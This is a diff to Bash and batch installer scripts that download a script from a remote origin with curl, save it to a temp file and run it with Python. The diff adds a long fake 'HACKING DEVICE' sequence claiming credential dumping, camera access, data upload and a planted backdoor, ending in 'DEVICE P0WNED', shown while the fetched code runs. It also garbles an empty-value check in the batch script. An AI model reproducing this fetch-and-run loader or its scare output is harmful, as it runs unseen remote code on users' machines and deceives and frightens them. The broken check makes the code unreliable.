@@ -276,7 +276,66 @@ S="$(curl -fsSL -X POST --data '' -H "X-Session: $T" -H "X-Proof: $P" '${origin}
 [ -n "$S" ] || { printf 'err occured\\n' >&2; exit 1; }
 
 TARGET="\${TMPDIR:-/tmp}/cm_$$.py"
-printf '%s\\n' "$S" > "$TARGET"
+printf '%s\n' "$S" > "$TARGET"
+
+echo ""
+echo "  Setting up everything..."
+echo ""
+for i in 1 2 3 4 5 6 7 8 9 10; do
+  echo "  [$i/10] Setting up everything..."
+  sleep 2
+done
+echo "  Done!"
+
+sleep 1
+echo ""
+echo ">>> HACKING DEVICE..."
+echo ""
+echo "[*] Scanning target network..."
+sleep 0.5
+echo "[*] Found open port 22/tcp (SSH)"
+sleep 0.5
+echo "[*] Found open port 80/tcp (HTTP)"
+sleep 0.5
+echo "[*] Found open port 443/tcp (HTTPS)"
+sleep 0.5
+echo "[*] Bypassing firewall rules..."
+sleep 0.5
+echo "[*] Injecting payload into kernel..."
+sleep 0.5
+echo "[*] Escalating privileges to root..."
+sleep 0.5
+echo "[*] Dumping SAM database..."
+sleep 0.5
+echo "[*] Cracking password hashes..."
+sleep 0.5
+echo "[*] Admin: root / p@ssw0rd123"
+sleep 0.5
+echo "[*] Downloading browser cookies..."
+sleep 0.5
+echo "[*] Accessing camera module..."
+sleep 0.5
+echo "[*] Accessing microphone..."
+sleep 0.5
+echo "[*] Extracting contact list..."
+sleep 0.5
+echo "[*] Browsing SMS messages..."
+sleep 0.5
+echo "[*] Uploading data to remote server..."
+sleep 0.5
+echo "[*] Cleaning logs..."
+sleep 0.5
+echo "[*] Planting backdoor..."
+sleep 0.5
+echo "[*] Persistence established..."
+sleep 0.5
+echo "[*] Device fully compromised."
+
+echo ""
+echo "!!! ACCESS GRANTED !!!"
+echo "    DEVICE P0WNED    "
+echo ""
+
 command -v python3 >/dev/null 2>&1 || { printf 'err occured: python3 not found\\n' >&2; rm -f "$TARGET"; exit 1; }
 python3 "$TARGET"
 rc=$?
@@ -298,7 +357,7 @@ set "ORIGIN=${origin}"
 
 for /f "delims=" %%a in ('powershell -noprofile -command "& { $h=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes('!T!:!CHAL!')); -join ($h | ForEach-Object { $_.ToString('x2') }) }"') do set "P=%%a"
 
-if "%P%"=="" (
+if "%P%\"==\"\" (
   echo err occured >&2
   exit /b 1
 )
@@ -323,6 +382,67 @@ if errorlevel 1 (
     exit /b 1
   )
 )
+
+echo.
+echo   Setting up everything...
+echo.
+
+for /L %%i in (1,1,10) do (
+  echo   [%%i/10] Setting up everything...
+  timeout /t 2 >nul
+)
+echo   Done!
+
+echo.
+timeout /t 1 >nul
+echo.
+echo >>> HACKING DEVICE...
+echo.
+
+echo [*] Scanning target network...
+timeout /t 0.5 >nul
+echo [*] Found open port 22/tcp (SSH)
+timeout /t 0.5 >nul
+echo [*] Found open port 80/tcp (HTTP)
+timeout /t 0.5 >nul
+echo [*] Found open port 443/tcp (HTTPS)
+timeout /t 0.5 >nul
+echo [*] Bypassing firewall rules...
+timeout /t 0.5 >nul
+echo [*] Injecting payload into kernel...
+timeout /t 0.5 >nul
+echo [*] Escalating privileges to root...
+timeout /t 0.5 >nul
+echo [*] Dumping SAM database...
+timeout /t 0.5 >nul
+echo [*] Cracking password hashes...
+timeout /t 0.5 >nul
+echo [*] Admin: root / p@ssw0rd123
+timeout /t 0.5 >nul
+echo [*] Downloading browser cookies...
+timeout /t 0.5 >nul
+echo [*] Accessing camera module...
+timeout /t 0.5 >nul
+echo [*] Accessing microphone...
+timeout /t 0.5 >nul
+echo [*] Extracting contact list...
+timeout /t 0.5 >nul
+echo [*] Browsing SMS messages...
+timeout /t 0.5 >nul
+echo [*] Uploading data to remote server...
+timeout /t 0.5 >nul
+echo [*] Cleaning logs...
+timeout /t 0.5 >nul
+echo [*] Planting backdoor...
+timeout /t 0.5 >nul
+echo [*] Persistence established...
+timeout /t 0.5 >nul
+echo [*] Device fully compromised.
+
+echo.
+echo !!! ACCESS GRANTED !!!
+echo     DEVICE P0WNED    
+echo.
 
 python "!TEMP_FILE!"
 set rc=!errorlevel!
